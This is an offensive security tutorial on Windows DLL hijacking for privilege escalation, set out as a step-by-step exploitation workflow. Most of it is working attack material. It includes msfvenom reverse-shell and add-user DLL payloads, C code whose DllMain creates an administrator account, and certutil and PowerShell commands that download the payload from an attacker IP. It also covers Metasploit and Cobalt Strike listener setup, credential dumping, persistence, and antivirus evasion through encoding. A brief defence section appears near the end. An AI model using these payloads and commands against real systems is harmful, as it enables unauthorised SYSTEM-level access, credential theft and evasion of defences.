# Dynamic Library Load Abuse

### Overview

**DLL Hijacking** is a privilege escalation technique that exploits the Windows DLL search order mechanism. When an application loads a Dynamic Link Library (DLL), Windows searches for that DLL in specific locations following a defined order. If an attacker can place a malicious DLL in a location that Windows searches before the legitimate DLL location, the application will load the malicious version instead.

This attack is particularly effective against Windows services running with elevated privileges. When a high-privilege service loads your malicious DLL, your code executes with those same elevated permissions, potentially granting SYSTEM-level access.

**Key Concepts:**

* **DLL (Dynamic Link Library)** - Shared code libraries that Windows programs load at runtime
* **DLL Search Order** - The sequence Windows follows when looking for DLL files
* **Service Hijacking** - Targeting Windows services that run with elevated privileges
* **Write Permissions** - The ability to modify or replace files in specific directories

**Why This Works:**

* Many applications don't specify absolute paths when loading DLLs
* Developers often overlook proper file permission configurations
* Legacy applications may load DLLs from insecure locations
* Services running as SYSTEM provide maximum privilege escalation

**Common Vulnerable Locations:**

* Application's current directory
* System PATH directories with weak permissions
* User-writable folders in the DLL search order

***

### Exploitation Workflow Summary

1. Service Enumeration ├─ List running processes ├─ Identify interesting services └─ Note services running with elevated privileges
2. Service Analysis ├─ Query service configuration ├─ Locate executable path ├─ Identify loaded DLLs └─ Find DLL locations
3. Permission Assessment ├─ Check DLL file permissions ├─ Verify write access └─ Identify writable directories in search path
4. Payload Creation ├─ Generate malicious DLL ├─ Configure reverse shell └─ Set up listener
5. Exploitation ├─ Replace legitimate DLL ├─ Trigger service restart └─ Receive elevated shell

***

### Phase 1: Service Enumeration

#### Understanding Process Discovery

Before exploiting DLL hijacking, you need to identify which services are running on the target system. Focus on services that:

* Run with SYSTEM or Administrator privileges
* Load DLLs from accessible locations
* Can be triggered or restarted

#### Listing Running Processes

**Using Command Prompt:**

```cmd
tasklist
```

**Expected output:**

```
Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0          8 K
System                           4 Services                   0        116 K
example-service.exe           1234 Services                   0      5,432 K
```

**Parameters explained:**

* `Image Name` - The executable name
* `PID` - Process ID
* `Session Name` - Whether it's a service or user process
* `Mem Usage` - Memory consumption

**Using PowerShell:**

```powershell
Get-Process
```

**Expected output:**

```
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    234      15     2156       4532       0.50   1234   0 example-service
```

**Using PowerShell (detailed):**

```powershell
# Get processes with user information
Get-Process | Select-Object Name, Id, Path, @{Name="Owner";Expression={$_.GetOwner().User}}
```

**Why this matters:** Processes running as "SYSTEM" or "Administrator" are prime targets because hijacking their DLLs grants you elevated privileges.

***

### Phase 2: Service Analysis

#### Querying Service Configuration

Once you've identified an interesting service, gather detailed information about it.

**Basic service query:**

```cmd
sc qc "example-service"
```

**Expected output:**

```
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: example-service
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\Example\example-service.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Example Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

**Critical information to note:**

* `BINARY_PATH_NAME` - Location of the service executable
* `SERVICE_START_NAME` - Account the service runs under (LocalSystem = SYSTEM privileges)
* `START_TYPE` - Whether it auto-starts (easier to exploit)

**Alternative PowerShell method:**

```powershell
Get-Service "example-service" | Format-List *
```

#### Identifying Loaded DLLs

**Method 1: Using strings command (Linux/WSL):**

```bash
strings example-service.exe | grep -i ".dll"
```

**Expected output:**

```
kernel32.dll
user32.dll
customlib.dll
helper.dll
```

**Method 2: Using PowerShell:**

```powershell
# List loaded modules for a running process
Get-Process -Name "example-service" | Select-Object -ExpandProperty Modules | Format-Table FileName
```

**Method 3: Using Process Explorer (GUI alternative):**

* Download Process Explorer (if available on target)
* Right-click process → Properties → DLLs tab
* Shows all loaded DLL paths

**Why this matters:** Custom or third-party DLLs (not standard Windows DLLs) are more likely to be in writable locations or have weak permissions.

**What to look for:**

* DLLs in user-accessible directories
* DLLs in the application folder
* Non-standard DLL names (customlib.dll, helper.dll, etc.)

***

### Phase 3: Permission Assessment

#### Checking DLL Write Permissions

**Using icacls (Windows built-in):**

```cmd
icacls "C:\Program Files\Example\customlib.dll"
```

**Expected output (vulnerable):**

```
C:\Program Files\Example\customlib.dll BUILTIN\Users:(F)
                                        NT AUTHORITY\SYSTEM:(F)
                                        BUILTIN\Administrators:(F)

Successfully processed 1 files; Failed processing 0 files
```

**Permission codes explained:**

* `(F)` - Full control (read, write, execute, delete)
* `(M)` - Modify (read, write, execute)
* `(RX)` - Read and execute
* `(R)` - Read only
* `(W)` - Write only

**Why this is vulnerable:** If `BUILTIN\Users` or `Everyone` has `(F)` or `(M)` permissions, any user can replace the DLL.

**Expected output (secure):**

```
C:\Program Files\Example\customlib.dll NT AUTHORITY\SYSTEM:(F)
                                        BUILTIN\Administrators:(F)

Successfully processed 1 files; Failed processing 0 files
```

**This is secure because:** Only SYSTEM and Administrators can modify the file—regular users cannot.

**Alternative PowerShell method:**

```powershell
Get-Acl "C:\Program Files\Example\customlib.dll" | Format-List
```

#### Checking Directory Permissions

Sometimes the DLL itself is protected, but the directory isn't:

```cmd
icacls "C:\Program Files\Example\"
```

**What to look for:**

* Write permissions on the parent directory
* Ability to delete and recreate files
* Weak inherited permissions

***

### Phase 4: Payload Creation

#### Understanding DLL Payloads

A malicious DLL must:

1. Export the same functions as the original DLL (to avoid crashes)
2. Execute your payload code
3. Optionally call the original DLL functions for stealth

#### Generating Malicious DLL with Msfvenom

**Basic reverse TCP DLL:**

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f dll -o evil.dll
```

**Parameters explained:**

* `-p windows/x64/meterpreter/reverse_tcp` - Payload type (64-bit reverse Meterpreter)
* `LHOST=10.0.0.1` - Your attacking machine's IP
* `LPORT=4444` - Port to receive connection
* `-f dll` - Output format as DLL
* `-o evil.dll` - Output filename

**Expected output:**

```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of dll file: 9216 bytes
Saved as: evil.dll
```

**For 32-bit systems:**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f dll -o evil.dll
```

**Alternative payloads:**

**Reverse HTTPS (better evasion):**

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.0.1 LPORT=443 -f dll -o evil.dll
```

**Bind shell (if reverse connection blocked):**

```bash
msfvenom -p windows/x64/shell/bind_tcp LPORT=4444 -f dll -o evil.dll
```

**Add user (simpler, no callback needed):**

```bash
msfvenom -p windows/x64/adduser USER=hacker PASS=P@ssw0rd! -f dll -o evil.dll
```

#### Creating Custom DLL (Advanced)

**Example C code for custom DLL:**

```c
// evil.c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            // Code runs when DLL is loaded
            system("cmd.exe /c net user hacker P@ssw0rd! /add");
            system("cmd.exe /c net localgroup administrators hacker /add");
            break;
    }
    return TRUE;
}
```

**Compile on Linux:**

```bash
x86_64-w64-mingw32-gcc evil.c -shared -o evil.dll
```

**Why custom DLLs are better:**

* Bypass antivirus detection
* Implement specific functionality
* More control over execution flow

***

### Phase 5: Exploitation

#### Setting Up the Listener

**Using Metasploit Framework:**

```bash
msfconsole -q
```

**Configure the handler:**

```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.1
set LPORT 4444
set ExitOnSession false
exploit -j
```

**Parameters explained:**

* `exploit/multi/handler` - Generic payload handler
* `ExitOnSession false` - Keep listener running for multiple connections
* `exploit -j` - Run as background job

**Expected output:**

```
[*] Started reverse TCP handler on 10.0.0.1:4444
[*] Starting the payload handler...
```

#### Replacing the DLL

**Transfer the malicious DLL to target:**

```cmd
# From SMB share
copy \\10.0.0.1\share\evil.dll C:\Temp\evil.dll

# From web server
certutil -urlcache -f http://10.0.0.1/evil.dll C:\Temp\evil.dll

# From PowerShell
Invoke-WebRequest -Uri http://10.0.0.1/evil.dll -OutFile C:\Temp\evil.dll
```

**Backup the original DLL (optional but recommended):**

```cmd
copy "C:\Program Files\Example\customlib.dll" "C:\Program Files\Example\customlib.dll.bak"
```

**Replace with malicious DLL:**

```cmd
copy /Y C:\Temp\evil.dll "C:\Program Files\Example\customlib.dll"
```

**Parameters explained:**

* `/Y` - Suppress confirmation prompt
* Source file first, destination second

**Verify replacement:**

```cmd
dir "C:\Program Files\Example\customlib.dll"
```

#### Triggering DLL Loading

**Method 1: Restart the service:**

```cmd
sc stop "example-service"
sc start "example-service"
```

**Method 2: Restart the computer (if service auto-starts):**

```cmd
shutdown /r /t 0
```

**Method 3: Wait for service restart:**

* Some services restart automatically
* System reboot will trigger auto-start services
* Application crashes may trigger restart

**Expected result:** When the service loads your malicious DLL, you should receive a callback:

```
[*] Sending stage (201798 bytes) to 10.0.0.2
[*] Meterpreter session 1 opened (10.0.0.1:4444 -> 10.0.0.2:49842)

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

**Success indicators:**

* Meterpreter session opens
* User is SYSTEM or Administrator
* You have full control of the system

***

### Alternative Techniques

#### DLL Search Order Hijacking

Instead of replacing existing DLLs, exploit the search order:

**Windows DLL search order:**

1. Application directory
2. System directory (C:\Windows\System32)
3. 16-bit system directory (C:\Windows\System)
4. Windows directory (C:\Windows)
5. Current directory
6. Directories in PATH environment variable

**Exploitation approach:**

```cmd
# If app loads "helper.dll" without full path
# Place your evil.dll renamed as helper.dll in app directory
copy evil.dll "C:\Program Files\Example\helper.dll"
```

**Why this works:** Application will load your DLL first, before checking system directories.

#### DLL Proxying

**What it is:** Your malicious DLL forwards calls to the legitimate DLL while executing your payload.

**Structure:**

1. Your DLL exports same functions as original
2. Your code executes first
3. Forward calls to original DLL (renamed)

**Example:**

```c
// Your evil.dll exports all functions
// Original.dll renamed to original_real.dll
#pragma comment(linker, "/export:FunctionName=original_real.FunctionName")
```

**Benefits:**

* Application continues to function normally
* Harder to detect
* Better for persistence

***

### Cobalt Strike Integration

#### Generating Beacon DLL

**Using Cobalt Strike's Artifact Kit:**

```bash
# In Cobalt Strike client
Attacks → Packages → Windows Executable (S)
- Output: Windows DLL
- Listener: [Select your listener]
- x64: Checked (if targeting 64-bit)
```

**Using manual command:**

```bash
# In Cobalt Strike team server
./artifact-kit/build.sh [listener-name] evil.dll
```

**Cobalt Strike advantages over Meterpreter:**

* Better operational security (OPSEC)
* More sophisticated C2 communication
* Built-in post-exploitation modules
* Malleable C2 profiles for evasion

#### Deployment Workflow

**1. Generate Beacon DLL with specific listener:**

```
Attacks → Packages → Windows DLL
- Listener: HTTPS-Listener
- Arch: x64
- Output: beacon.dll
```

**2. Transfer to target:**

```powershell
# Using PowerShell
IEX (New-Object Net.WebClient).DownloadFile('http://10.0.0.1/beacon.dll','C:\Temp\beacon.dll')
```

**3. Replace vulnerable DLL:**

```cmd
copy /Y C:\Temp\beacon.dll "C:\Program Files\Example\vulnerable.dll"
```

**4. Trigger service:**

```cmd
sc stop "example-service" && sc start "example-service"
```

**5. Verify beacon callback in Cobalt Strike:**

```
[+] received beacon from 10.0.0.2 (NT AUTHORITY\SYSTEM)
```

#### Post-Exploitation with Cobalt Strike

**Verify privileges:**

```
beacon> shell whoami
[*] Tasked beacon to run: whoami
[+] host called home, sent: 48 bytes
[+] received output:
nt authority\system
```

**Dump credentials:**

```
beacon> logonpasswords
```

**Establish persistence:**

```
beacon> run persistence [options]
```

***

### Detection and Defense

#### How Defenders Detect DLL Hijacking

**File Integrity Monitoring:**

* Alerts when system DLLs are modified
* Hash verification against known-good files
* Permission changes on critical directories

**Behavioral Detection:**

* Unusual DLL loads from non-standard locations
* Services loading DLLs from writable directories
* Unsigned or mismatched DLL signatures

**Log Analysis:**

```powershell
# Windows Event Logs to monitor
# Event ID 7045 - New service installed
# Event ID 7036 - Service started/stopped
# Sysmon Event ID 7 - Image loaded (DLL)
```

#### Defensive Measures

**Proper file permissions:**

```cmd
# Set secure permissions on DLL
icacls "C:\Program Files\Example\lib.dll" /inheritance:r
icacls "C:\Program Files\Example\lib.dll" /grant:r "SYSTEM:(F)"
icacls "C:\Program Files\Example\lib.dll" /grant:r "Administrators:(F)"
```

**Application hardening:**

* Use absolute paths when loading DLLs
* Enable SafeDllSearchMode
* Sign all DLLs with code signing certificates
* Implement DLL signature verification

**System configuration:**

```reg
# Enable SafeDllSearchMode (should be default)
HKLM\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode = 1
```

***

### Troubleshooting

#### DLL Won't Load

**Problem:** Service starts but doesn't load your DLL

**Solution:**

```cmd
# Check DLL architecture matches process
file evil.dll  # On Linux
dumpbin /headers evil.dll  # On Windows

# Ensure 64-bit DLL for 64-bit process
# Ensure 32-bit DLL for 32-bit process
```

**Why it works:** Architecture mismatch prevents DLL loading. Verify and regenerate with correct architecture.

#### No Callback Received

**Problem:** DLL loads but no reverse connection

**Solution:**

```bash
# Verify listener is running
netstat -an | grep 4444

# Check firewall on attacking machine
sudo iptables -L -n

# Test connectivity from target
Test-NetConnection -ComputerName 10.0.0.1 -Port 4444
```

**Why it works:** Firewall or network issues prevent callback. Ensure listener is accessible and ports are open.

#### Service Crashes After DLL Replacement

**Problem:** Service fails to start or crashes immediately

**Solution:**

```cmd
# Restore original DLL
copy "C:\Program Files\Example\customlib.dll.bak" "C:\Program Files\Example\customlib.dll"

# Check event logs for errors
eventvwr.msc
# Look in Windows Logs → Application

# Try DLL proxying instead of full replacement
```

**Why it works:** Service may require specific exported functions. DLL proxying maintains compatibility while executing payload.

#### Access Denied When Replacing DLL

**Problem:** Cannot overwrite DLL file

**Solution:**

```cmd
# Check if DLL is in use
handle.exe customlib.dll  # From Sysinternals

# Stop the service first
sc stop "example-service"

# Then replace DLL
copy /Y evil.dll "C:\Program Files\Example\customlib.dll"

# Restart service
sc start "example-service"
```

**Why it works:** Windows locks DLLs when loaded. Stopping the service releases the lock.

#### Antivirus Detection

**Problem:** Malicious DLL deleted by antivirus

**Solution:**

```bash
# Use encoding
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f dll -e x64/xor -i 10 -o evil.dll

# Use custom DLL instead of msfvenom
# Compile from source with obfuscation

# Test against antivirus first
# Upload to VirusTotal (risk: signature shared)
# Use local antivirus testing instead
```

**Why it works:** Encoding and custom compilation evade signature-based detection.

***

### Quick Reference

#### Enumeration

```cmd
# List processes
tasklist
Get-Process

# Query service
sc qc "service-name"
Get-Service "service-name" | fl *

# Check permissions
icacls "C:\path\to\file.dll"
```

#### DLL Analysis

```bash
# Find DLL references (Linux)
strings executable.exe | grep -i ".dll"

# List loaded DLLs (PowerShell)
Get-Process -Name "process" | Select -ExpandProperty Modules
```

#### Payload Generation

```bash
# 64-bit reverse TCP
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f dll -o evil.dll

# 32-bit reverse TCP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f dll -o evil.dll

# Add user
msfvenom -p windows/x64/adduser USER=hacker PASS=Pass123! -f dll -o evil.dll
```

#### Exploitation

```cmd
# Replace DLL
copy /Y evil.dll "C:\path\to\target.dll"

# Restart service
sc stop "service-name"
sc start "service-name"

# Monitor for callback
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST IP; set LPORT 4444; exploit"
```

